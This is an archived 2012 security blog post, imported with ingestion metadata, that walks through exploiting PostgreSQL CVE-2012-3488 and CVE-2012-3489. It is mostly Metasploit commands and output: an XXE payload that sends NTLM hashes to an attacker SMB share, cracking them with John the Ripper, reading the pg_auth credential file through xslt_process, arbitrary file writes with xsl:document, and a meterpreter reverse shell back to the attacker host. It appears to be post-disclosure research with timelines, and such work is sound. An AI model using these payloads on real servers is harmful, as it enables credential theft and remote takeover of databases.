---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2012-08-28_all-your-postgresql-databases-are-belong-to-us.md
original_filename: 2012-08-28_all-your-postgresql-databases-are-belong-to-us.md
title: All your PostgreSQL databases are belong to us
category: blogs
detected_topics:
- sso
- access-control
- sqli
- command-injection
- otp
tags:
- imported
- blogs
- sso
- access-control
- sqli
- command-injection
- otp
language: en
raw_sha256: 3294bfceb642999f1a142f238879df750a4cee8cbd24344128edf1a0b16c1288
text_sha256: c74846e9a6c2f0759012d1a6d6c081c15ef73563c92b2b1938597b55231dcfb3
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: true
---

# All your PostgreSQL databases are belong to us

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2012-08-28_all-your-postgresql-databases-are-belong-to-us.md
- Source Type: markdown
- Detected Topics: sso, access-control, sqli, command-injection, otp
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: True
- Raw SHA256: `3294bfceb642999f1a142f238879df750a4cee8cbd24344128edf1a0b16c1288`
- Text SHA256: `c74846e9a6c2f0759012d1a6d6c081c15ef73563c92b2b1938597b55231dcfb3`


## Content

---
title: "All your PostgreSQL databases are belong to us"
page_title: "All your PostgreSQL databases are belong to us | Agarri : Sécurité informatique offensive"
url: "https://www.agarri.fr/blog/archives/2012/08/28/all_your_postgresql_databases_are_belong_to_us/index.html"
final_url: "https://www.agarri.fr/blog/archives/2012/08/28/all_your_postgresql_databases_are_belong_to_us/index.html"
authors: ["Nicolas Grégoire (@Agarri_FR)"]
programs: ["PostgreSQL", "libxslt"]
bugs: ["XXE", "Privilege escalation"]
publication_date: "2012-08-28"
added_date: "2024-02-06"
source: "pentester.land/writeups.json"
original_index: 6415
---

* [Home](/en/index.html "Home page")
  * [Company](/en/company.html "Company details")
  * [Publications](/en/publications.html "Public interventions and published vulnerabilities")
  * [Trainings](/en/trainings.html "Burp Suite Pro training")
  * [Blog](/blog/ "Technical analysis and personnal opinions")
  * [ ![fr](/images/fr.png)](/fr/ "French version")

[Main](https://www.agarri.fr/blog/index.html) > [Archives](https://www.agarri.fr/blog/archives/index.html) > [2012](https://www.agarri.fr/blog/archives/2012/index.html) > [08](https://www.agarri.fr/blog/archives/2012/08/index.html) >  
[<](https://www.agarri.fr/blog/archives/2012/07/02/from_xslt_code_execution_to_meterpreter_shells/index.html) 00:32:18 [>](https://www.agarri.fr/blog/archives/2012/11/26/zeronights_2012_opinions_and_links/index.html)

##  mardi 28 août 2012, 00:32:18 (UTC+0200) 

### All your PostgreSQL databases are belong to us

On August 17, 2012, PostgreSQL released a [security advisory](http://www.postgresql.org/about/news/1407/) including patches for [CVE-2012-3488](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3488) and [CVE-2012-3489](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3489). This post will describe these vulnerabilities and how to exploit them. Please notice that an authenticated access to the database is needed in every scenario, either via direct access to PostgreSQL port or via SQL injection. I'll now demonstrate three distinct ways to gain administrative privileges on a PostgreSQL server, using Metasploit and a Windows version of Postgres 8.4.12.

  

  * Pwnage #1: Semi-blind / error-based XXE

  

Let's begin with CVE-2012-3489. The PostgreSQL description is _"xml_parse() DTD validation can be used to read arbitrary files"_. In fact, without additional vectors, this is "only" a semi-blind (I mean error-based) XML External Entity vulnerability. It is possible to access local and remote files under the context of the PostgreSQL user, but a XML syntax error is needed in order to retrieve fragments of the target file. Under Unix, denial of service attacks via /dev/random are possible. Under Windows, the database is run under a _standard_ account and stealing LM and NTLM hashes is possible. All is needed is outbound TCP/445 or TCP/80 connectivity to an attacker-controlled server. In a typical LAN deployment, the attacker can then connect back to the target server and re-use the stolen credentials.

  

The Metapsloit module "smb" is started:
  
  
  $ sudo msfconsole
  msf > use auxiliary/server/capture/smb
  msf auxiliary(smb) > exploit
  

  

The attacker can connect to the PostgreSQL server but he doesn't have any privilege:
  
  
  msf > use auxiliary/scanner/postgres/postgres_hashdump
  msf auxiliary(postgres_hashdump) > set USERNAME nopriv
  msf auxiliary(postgres_hashdump) > set PASSWORD foobar
  msf auxiliary(postgres_hashdump) > set RHOSTS 192.168.27.107
  msf auxiliary(postgres_hashdump) > exploit
  [-] 192.168.27.107:5432 Postgres - Insufficent permissions // Yes, that's a typo ;-)
  

  

So he triggers the xml_parse() vulnerability (here via a direct connection to TCP/5432 but SQL injection is another valid vector):
  
  
  msf > use auxiliary/admin/postgres/postgres_sql
  msf auxiliary(postgres_sql) > set USERNAME nopriv
  msf auxiliary(postgres_sql) > set PASSWORD foobar
  msf auxiliary(postgres_sql) > set RHOST 192.168.27.107
  msf auxiliary(postgres_sql) > set SQL 'select xmlparse(document $$<!DOCTYPE x [ <!ENTITY abc SYSTEM "//192.168.2.218/evil_share/foo.txt"> ] ><x>&abc;</x>$$);'
  msf auxiliary(postgres_sql) > exploit
  

  

On the Metasploit side:
  
  
  NTLMv1 Response Captured from 192.168.27.107:1100 - 192.168.27.107 
  USER:postgres DOMAIN:DEMO-CONFS OS:Windows 2002 Service Pack 3 2600 LM:Windows 2002 5.1
  LMHASH:8d27f92d***REDACTED-SUSPECT-TOKEN***  NTHASH:e1593d33***REDACTED-SUSPECT-TOKEN***The captured hash is then cracked using John The Ripper, rainbow tables, or any "in the cloud" solution:
  
  
  $ cat postgresql-hashes.txt
  postgres:$NETLM$1122334455667788$8d27f92d8d9c73a27a2ffa4337e881472f85252cc731bb25:::::::
  $ john postgresql-hashes.txt
  Loaded 1 password hash (LM C/R DES [netlm])
  TOTO  (postgres)
  guesses: 1  time: 0:00:00:02 100% (2)  c/s: 332409  trying: TOTO
  

  

By default, the password of the service and application accounts are identical under Windows. This allows the attacker to connect via either SMB (with _standard_ OS privileges and depending on the applicable security policy) or PostgreSQL (with administrative database privileges):
  
  
  msf > use auxiliary/scanner/postgres/postgres_hashdump
  msf auxiliary(postgres_hashdump) > set USERNAME postgres
  msf auxiliary(postgres_hashdump) > set PASSWORD toto
  msf auxiliary(postgres_hashdump) > set RHOSTS 192.168.27.107
  msf auxiliary(postgres_hashdump) > exploit
  
  [*] Query appears to have run successfully
  [+] Postgres Server Hashes
  ======================
  
  Username  Hash
  --------  ----
  nopriv  ***REDACTED-SUSPECT-TOKEN***  app_hr  ***REDACTED-SUSPECT-TOKEN***  app_crm  ***REDACTED-SUSPECT-TOKEN***  postgres  ***REDACTED-SUSPECT-TOKEN***  * Pwnage #2: Typical XXE via XSLT

  

If the contrib/xml2 module is available, xslt_process() can be used to retrieve the value of external XML entities. An empty XSLT stylesheet (thanks to the [Built-in Template Rules](http://www.w3.org/TR/xslt/#built-in-rule)) is run in order to copy the source XML document. The "global/pg_auth" file, which contains the PostgreSQL credentials, is a perfect target:
  
  
  msf > use auxiliary/admin/postgres/postgres_sql
  msf auxiliary(postgres_sql) > set USERNAME nopriv
  msf auxiliary(postgres_sql) > set PASSWORD foobar
  msf auxiliary(postgres_sql) > set RHOST 192.168.27.107
  msf auxiliary(postgres_sql) > set SQL 'select xslt_process($$<!DOCTYPE x [<!ENTITY abc SYSTEM "global/pg_auth"> ] ><x>&abc;</x>$$::text, $$<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"></xsl:stylesheet>$$::text);'
  msf auxiliary(postgres_sql) > exploit
  xslt_process
  ------------
  <?xml version="1.0"?>
  "nopriv" "md5dc4a7869c4e7182783c33d91308ffe10" ""
  "app_hr" "b4270e25c9fadba2b79e18055141d882" ""
  "app_crm" "527bd5b5d689e2c32ae974c6229ff785" ""
  "postgres" "md59fa7827a30a483125ca3b7218bad6fee" ""
  

  

However, there's another vulnerability in the contrib/xml2 module providing xslt_process(), like described now with CVE-2012-3488.

  

  * Pwnage #3: Abuse of the xsl:document feature in libxslt

  

The PostgreSQL description is _"contrib/xml2's xslt_process() can be used to read and write arbitrary files"_. Technically, this is exactly the same vulnerability that those I already reported in Webkit (CVE-2011-1774), xmlsec (CVE-2011-1425) and PHP5 (CVE-2012-0057): an attacker can gain write access to the filesystem by abusing legitimate features of the libxslt XSLT processor. It's funny to notice that my PoC from 2011 works flawlessly:
  
  
  msf > use auxiliary/admin/postgres/postgres_sql
  msf auxiliary(postgres_sql) > set USERNAME nopriv
  msf auxiliary(postgres_sql) > set PASSWORD foobar
  msf auxiliary(postgres_sql) > set RHOST 192.168.27.107
  msf auxiliary(postgres_sql) > set SQL 'select xslt_process($$<x/>$$::text, $$<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"><xsl:template match="/"><xsl:document href="aybabtu.txt" method="text"><xsl:text>All your base are belong to us.</xsl:text></xsl:document></xsl:template></xsl:stylesheet>$$::text);'
  msf auxiliary(postgres_sql) > exploit
  

  
No output, but we should have created "aybabtu.txt" in the data directory. Let's use the XXE+XSLT vulnerability in order to check:
  
  
  msf > use auxiliary/admin/postgres/postgres_sql
  msf auxiliary(postgres_sql) > set USERNAME nopriv
  msf auxiliary(postgres_sql) > set PASSWORD foobar
  msf auxiliary(postgres_sql) > set RHOST 192.168.27.107
  msf auxiliary(postgres_sql) > set SQL 'select xslt_process($$<!DOCTYPE x [<!ENTITY abc SYSTEM "aybabtu.txt"> ] ><x>&abc;</x>$$::text, $$<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0"></xsl:stylesheet>$$::text);'
  msf auxiliary(postgres_sql) > exploit
  xslt_process
  ------------
  <?xml version="1.0"?>
  All your base are belong to us.
  

Bingo! Given that overwriting existing files is acceptable, it's even possible to modify the "postgresql.conf" configuration file, nullify an existing database or even add our own account to "global/pg_auth".

  

  * From PostgreSQL administrative privileges to command execution

  

We have now three ways to gain administrative access to the database: steal the LM/NTLM hashes from the network, steal the MD5 hashes from "global/pg_auth" or overwrite "global/pg_auth" with your own account details. This is already cool, but some people really want to see a Meterpreter shell. Luckily, the "postgres_payload" Metasploit module does just that:
  
  
  msf > use exploit/windows/postgres/postgres_payload
  msf exploit(postgres_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
  msf exploit(postgres_payload) > set USERNAME postgres
  msf exploit(postgres_payload) > set PASSWORD toto
  msf exploit(postgres_payload) > set RHOST 192.168.27.107
  msf exploit(postgres_payload) > exploit
  [*] Started reverse handler on 192.168.2.218:4444 
  [*] Authentication successful and vulnerable version 8.4 on Windows confirmed.
  [*] Uploaded flJBELWn.dll as OID 33011 to table jnrotcvq(ipmhmpch)
  [*] Command Stager progress -  1.48% done (1499/101465 bytes)
  [*] Command Stager progress -  2.95% done (2998/101465 bytes)
  [*] Command Stager progress -  4.43% done (4497/101465 bytes)
  ...
  [*] Command Stager progress -  96.03% done (97435/101465 bytes)
  [*] Command Stager progress -  97.51% done (98934/101465 bytes)
  [*] Command Stager progress -  98.95% done (100400/101465 bytes)
  meterpreter > getuid
  Server username: DEMO-CONFS\postgres
  

  

  * Timelines

  

CVE-2012-3489 (dereference of XML External Entities):  
\- May 2011: Internal identification of the issue by the PostgreSQL team  
\- May 2012: Independent re-discovery by Vladimir Vorontsov (aka [d0znpp](https://twitter.com/d0znpp))  
\- June 2012: Disclosure of the bug at PHDays ([blog post](http://lab.onsec.ru/2012/06/postgresql-all-error-based-xxe-0day.html))  
\- July 2012: Notification of the PostgreSQL security team  
\- August 2012: Release of patched versions

  

CVE-2012-3488 (abuse of a libxslt feature):  
\- February 2011: Publication of a similar vulnerability in Webkit (CVE-2011-1774)  
\- March 2011: Publication of a similar vulnerability in xmlsec (CVE-2011-1425)  
\- January 2012: Publication of a similar vulnerability in PHP (CVE-2012-0057)  
\- February 2012: Internal identification of the issue by the PostgreSQL team  
\- June 2012: Discovery by myself that PostgreSQL is affected  
\- July 2012: Notification of the PostgreSQL security team  
\- August 2012: Release of patched versions

  
Posted by Nicolas Grégoire | [Permanent link](https://www.agarri.fr/blog/archives/2012/08/28/all_your_postgresql_databases_are_belong_to_us/index.html)

/\

###  webmaster@agarri.fr  
Copyright 2010-2021 Agarri
